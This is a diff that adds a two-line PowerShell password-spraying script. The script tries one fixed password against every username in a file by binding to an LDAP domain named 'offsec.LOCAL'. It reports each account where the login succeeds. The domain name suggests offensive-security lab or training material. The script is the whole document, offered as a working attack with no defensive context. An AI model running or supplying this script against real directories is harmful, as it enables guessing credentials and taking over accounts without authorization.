@@ -1,1 +1,3 @@
 
+$password = "zzzz";
+cat .\users.txt | % { $q = New-Object System.DirectoryServices.DirectoryEntry("LDAP://offsec.LOCAL","$_","$password"); if ($q.name -ne $null){Write-Host -ForegroundColor Green "[*] User:$_ Password:$password"} }
